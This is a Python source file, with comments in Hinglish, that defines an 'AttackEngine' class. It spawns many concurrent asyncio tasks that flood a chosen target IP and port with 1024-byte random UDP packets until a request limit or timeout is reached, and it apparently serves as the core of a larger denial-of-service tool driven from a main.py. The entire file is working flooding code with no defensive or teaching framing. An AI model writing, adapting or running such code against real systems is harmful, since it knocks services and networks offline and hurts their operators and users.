import asyncio
import random
import time
import logging
from dataclasses import dataclass, field

# Logging setup
logger = logging.getLogger("AttackEngine")

@dataclass
class AttackStats:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    start_time: float = 0.0
    is_running: bool = False
    target: str = ""
    port: int = 0

class AttackEngine:  # Naam 'AttackEngine' hi rakha hai taaki main.py crash na ho
    def __init__(self, max_requests: int, thread_count: int, timeout: int):
        self.max_requests = max_requests
        self.intensity = thread_count # thread_count ko yahan intensity mana jayega
        self.timeout = timeout
        self.stats = AttackStats()
        self._stop_event = asyncio.Event()

    def stop_attack(self):
        self.stats.is_running = False
        self._stop_event.set()

    async def udp_flood_task(self, target_ip, target_port):
        loop = asyncio.get_running_loop()
        try:
            transport, protocol = await loop.create_datagram_endpoint(
                lambda: asyncio.DatagramProtocol(),
                remote_addr=(target_ip, target_port)
            )
            payload = random._urandom(1024)
            while self.stats.is_running and self.stats.total_requests < self.max_requests:
                transport.sendto(payload)
                self.stats.total_requests += 1
                await asyncio.sleep(0) # Context switch
            transport.close()
        except Exception:
            self.stats.failed += 1

    async def run_attack(self, target_ip, target_port, method="udp"):
        """Ye method main.py se call hoga"""
        self.stats.is_running = True
        self.stats.target = target_ip
        self.stats.port = target_port
        self.stats.start_time = time.time()
        self.stats.total_requests = 0

        logger.info(f"Starting {method} on {target_ip}:{target_port}")
        
        tasks = []
        for _ in range(self.intensity):
            tasks.append(self.udp_flood_task(target_ip, target_port))

        try:
            # gather se saare tasks ek sath chalenge
            await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.timeout)
        except (asyncio.TimeoutError, Exception):
            pass
        finally:
            self.stop_attack()

# Helper for main.py integration
def get_engine(max_req, threads, timeout):
    return AttackEngine(max_req, threads, timeout)
